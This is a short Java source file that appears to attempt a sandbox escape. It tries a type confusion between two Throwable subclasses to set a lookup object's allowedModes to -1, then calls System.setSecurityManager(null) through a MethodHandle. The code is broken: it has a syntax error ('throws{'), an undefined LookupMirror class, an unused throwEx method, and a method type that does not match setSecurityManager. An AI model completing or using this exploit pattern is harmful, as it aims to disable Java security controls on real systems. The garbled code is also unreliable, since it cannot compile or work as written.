import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

public class Main {
	public static class BadCast1 extends Throwable{
		Object o1 = MethodHandles.publicLookup();
	}
	
	public static class BadCast2 extends Throwable{
		LookupMirror lm = new LookupMirror();
	}
	
	public static void throwEx() throws{
		throw new BadCast1();
	}
	
	public static void handleEx(BadCast2 e){
		e.lm.allowedModes = -1;
	}
	
	public static void main(String[] args) throws Throwable {
		BadCast2 e = new BadCast2();
		handleEx(e);
		MethodType mt = MethodType.methodType(void.class, System.class);
		MethodHandle mh = MethodHandles.lookup().findStatic(System.class, "setSecurityManager", mt);
		mh.invokeExact(System.class, null);
	}

}
